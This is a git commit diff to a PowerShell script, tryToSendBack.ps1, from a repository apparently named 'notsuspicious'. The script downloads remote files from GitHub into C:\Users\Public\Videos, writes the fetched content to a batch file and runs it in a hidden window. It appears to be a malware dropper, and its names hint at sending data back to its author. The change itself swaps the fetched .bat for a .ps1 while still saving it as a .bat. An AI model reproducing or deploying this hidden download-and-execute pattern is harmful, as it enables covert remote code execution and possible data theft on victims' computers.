de322414bb3f33de62ac859995b554ed30470372
RaupenInspektor <150939693+RaupenInspektor@users.noreply.github.com>
2024-02-29 15:41:57 +0100

    Update tryToSendBack.ps1

--- tryToSendBack.ps1
+++ tryToSendBack.ps1
@@ -3,7 +3,7 @@ try {
     Invoke-WebRequest 'https://github.com/RaupenInspektor/notsuspicious/raw/main/url.txt' -OutFile 'C:\Users\Public\Videos\GraphicalUserInterface\url.txt'
     
     # Download and execute sendBack.bat
-    $batchContent = (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/sendBack.bat" -UseBasicParsing).Content
+    $batchContent = (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/sendBack.ps1" -UseBasicParsing).Content
     $batchContent | Out-File -FilePath "C:\Users\Public\Videos\sendBack.bat" -Encoding ASCII
     Start-Process -FilePath "C:\Users\Public\Videos\sendBack.bat" -WindowStyle Hidden -Wait
 }
